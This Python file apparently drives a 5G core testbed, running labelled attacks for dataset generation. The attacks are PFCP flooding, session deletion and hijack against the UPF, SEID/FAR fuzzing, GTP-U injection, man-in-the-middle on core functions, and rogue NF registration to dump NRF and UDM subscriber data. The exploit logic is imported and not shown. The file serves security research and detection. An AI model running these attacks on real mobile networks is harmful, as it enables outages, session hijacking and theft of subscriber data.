from marker_process.markers_process import handle_markers
from src.attacks import *
from src.utils import ip_list
import random, ipaddress, docker


# ---------------------------------------------------------------------------- #
#                                Utils Functions                               #
# ---------------------------------------------------------------------------- #
def generate_random_public_ipv4():

    while True:
        random_int = random.randint(0, 2**32 - 1)
        random_ip = ipaddress.IPv4Address(random_int)
        if random_ip.is_global:
            return str(random_ip)


def get_random_supi():
    client = docker.DockerClient(base_url="unix://var/run/docker.sock")
    container = client.containers.get("ueransim")

    supi_finder = "grep -oP '(?<=supi: \")[^\"]+' config/supi_test.yaml"
    result = container.exec_run(supi_finder, stdout=True, stderr=True)
    resStr = result.output.decode()
    supiList = resStr.split("\n")
    supiList = [item for item in supiList if item]
    return random.choice(supiList)


# ---------------------------------------------------------------------------- #
#                               PFCP DoS Attacks                               #
# ---------------------------------------------------------------------------- #
def pfcp_session_establishment_flood_labelized(spoofed_addr):

    handle_markers(
        "pfcpSessionEstablishmentFlood",
        lambda: PFCPDosAttack().start_pfcp_session_establishment_flood(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            reqNbr=random.randint(10, 100),
            random_far_number=random.randint(1, 25),
        ),
    )


def pfcp_session_deletion_flood_labelized(spoofed_addr):
    handle_markers(
        "pfcpSessionDeletionFlood",
        lambda: PFCPDosAttack().start_pfcp_session_deletion_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            reqNbr=random.randint(10, 100),
        ),
    )


# def pfcp_session_deletion_targeted_labelized(spoofed_addr):
#     handle_markers(
#         "pfcpSessionDeletionTargeted",
#         lambda: PFCPDosAttack().start_pfcp_session_deletion_targeted(
#             evil_addr=spoofed_addr,
#             upf_addr=ip_list["UPF"],
#             target_seid=random.randint(1, 5),
#         ),
#     )


def pfcp_session_modification_far_drop_bruteforce_labelized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDropBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_drop_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=random.randint(1, 25),
            session_range=random.randint(5, 25),
        ),
    )


def pfcp_session_modification_far_dupl_bruteforce_labelized(spoofed_addr):
    handle_markers(
        "pfcpSessionModificationFarDuplBruteforce",
        lambda: PFCPDosAttack().start_pfcp_session_modification_far_dupl_bruteforce(
            evil_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            far_range=random.randint(1, 25),
            session_range=random.randint(5, 25),
        ),
    )


# ---------------------------------------------------------------------------- #
#                             PFCP Fuzzing Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_seid_fuzzing_labelized(spoofed_addr):
    handle_markers(
        "pfcpSeidFuzzing",
        lambda: PFCPFuzzer().start_PFCP_SEID_fuzzing(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            max_seid=random.randint(5, 25),
        ),
    )


def pfcp_far_fuzzing_labelized(spoofed_addr):
    handle_markers(
        "pfcpFarFuzzing",
        lambda: PFCPFuzzer().start_PFCP_FARID_fuzzing(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            max_far_discover=random.randint(1, 10),
            max_seid=random.randint(5, 25),
        ),
    )


# ---------------------------------------------------------------------------- #
#                              PFCP Hijack Attacks                             #
# ---------------------------------------------------------------------------- #
def pfcp_hijack_far_manipulation_labelized(spoofed_addr):
    handle_markers(
        "pfcpHijackFarManipulation",
        lambda: PFCPHijack().start_PFCP_hijack_far_manipulation(
            hijacker_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            seid=random.randint(1, 20),
        ),
    )


# ---------------------------------------------------------------------------- #
#                                 GTP-U Attacks                                #
# ---------------------------------------------------------------------------- #
def gtp_uplink_attack_labelized(spoofed_addr):

    if not ue_list:
        print("[!] No active UEs found. Cannot perform GTP-U uplink attack.")
        return
    valid_ue_list = list()
    for ue in ue_list:
        if ue["state"] == "registered" and ue["isPduSessionActive"]:
            valid_ue_list.append(ue)
    if not valid_ue_list:
        print("[!] No valid UEs found for GTP-U uplink attack.")
        return

    random_ue = random.choice(valid_ue_list)

    pingable_ips = [
        "8.8.8.8",
        "8.8.4.4",
        "1.1.1.1",
        "1.0.0.1",
        "9.9.9.9",
        "208.67.222.222",
        "208.67.220.220",
    ]

    handle_markers(
        "gtpUplinkAttack",
        lambda: start_gtp_uplink_attack(
            src_addr=spoofed_addr,
            upf_addr=ip_list["UPF"],
            teid=random_ue["teid_uplink"],
            ue_addr=random_ue["ipv4"],
            dst_addr=random.choice(pingable_ips),
        ),
    )


def pfcp_in_gtp_attack_labelized(spoofed_addr):
    if not ue_list:
        print("[!] No active UEs found. Cannot perform PFCP in GTP attack.")
        return
    valid_ue_list = list()
    for ue in ue_list:
        if ue["state"] == "registered" and ue["isPduSessionActive"]:
            valid_ue_list.append(ue)
    if not valid_ue_list:
        print("[!] No valid UEs found for PFCP in GTP attack.")
        return

    random_ue = random.choice(valid_ue_list)

    handle_markers(
        "pfcpInGtpAttack",
        lambda: start_pfcp_in_gtp_attack_from_evil(
            ue_addr=random_ue["ipv4"],
            iname=random_ue["iname"],
        ),
    )


# ---------------------------------------------------------------------------- #
#                             HTTP-Based CN Attacks                            #
# ---------------------------------------------------------------------------- #


def cn_mitm_labelized(spoofed_addr):
    victims_nfs = [
        "UDM",
        "AMF",
        "SMF",
        "AUSF",
        "PCF",
        "UDR",
        "NSSF",
        "CHF",
        "NEF",
    ]

    handle_markers(
        "cnMitm",
        lambda: start_mitm_for(
            nf_to_replace=random.choice(victims_nfs),
            seconds=random.randint(5, 30),
        ),
    )


def free5gcCNFuzzing_labelized(spoofed_addr):

    handle_markers(
        "cnFuzzing",
        lambda: Free5GCCNFuzzing().fuzz(
            nf_list=["NRF"],
            nb_file=random.randint(1, 10),
            nb_url=random.randint(1, 10),
            nb_method=random.randint(1, 10),
        ),
    )


def nrf_manipulation_dump_all_nf_labelized():
    print("[*] Dumping all NF instances from NRF...")
    nf_instance_id = generate_variables("uuid")
    token = setup_rogue(nf_instance_id, nf_type="AMF", scope="nudm-sdm")
    code, result = get_nf_info("AMF", token, "None", display=False)
    print(f"[*] Status code: {code}")
    print(f"[*] Result: {result}")
    print("[+] Finished dumping all NF instances from NRF.")


def nrf_manipulation_dump_random_nf_labelized():
    nf_list = [
        "UDM",
        "AMF",
        "SMF",
        "AUSF",
        "PCF",
        "UDR",
        "NSSF",
        "CHF",
        "NEF",
    ]

    random_nf_nbr = random.randint(1, len(nf_list))

    random_nf_list = random.sample(nf_list, random_nf_nbr)

    for random_nf in random_nf_list:
        print(f"[*] Dumping NF instance {random_nf} from NRF...")
        nf_instance_id = generate_variables("uuid")
        token = setup_rogue(nf_instance_id, nf_type="AMF", scope="nudm-sdm")
        code, result = get_nf_info("AMF", token, random_nf, display=False)
        print(f"[*] Status code: {code}")
        print(f"[*] Result: {result}")
        print(f"[+] Finished dumping NF instance {random_nf} from NRF.")


# ---------------------------------------------------------------------------- #
#                                  UDM ATTACKS                                 #
# ---------------------------------------------------------------------------- #


def get_am_data_labelized():
    nf_instance_id = generate_variables("uuid")
    add_nf(nf_instance_id, "AMF", display=False)
    token = get_token(nf_instance_id, "AMF", "nnrf-disc", "NRF", display=False)
    supi = "imsi-208930000000001"
    code, infos = get_am_data(supi, token, mcc="208", mnc="93", display=False)
    remove_nf(nf_instance_id, token, display=False)
    return code, infos


def get_dnn_labelized():
    nf_instance_id = generate_variables("uuid")
    add_nf(nf_instance_id, "AMF", display=False)
    token = get_token(nf_instance_id, "AMF", "nnrf-disc", "NRF", display=False)
    supi = "imsi-208930000000001"
    code, infos = get_dnn(supi, token, mcc="208", mnc="93", display=False)
    remove_nf(nf_instance_id, token, display=False)
    return code, infos


def get_sm_data_labelized():
    nf_instance_id = generate_variables("uuid")
    add_nf(nf_instance_id, "AMF", display=False)
    token = get_token(nf_instance_id, "AMF", "nnrf-disc", "NRF", display=False)
    supi = "imsi-208930000000001"
    code, infos = get_sm_data(
        supi, token, mcc="208", mnc="93", sst=1, sd="010203", display=False
    )
    remove_nf(nf_instance_id, token, display=False)
    return code, infos


# TODO : Ajouter attaque get_nf je crois
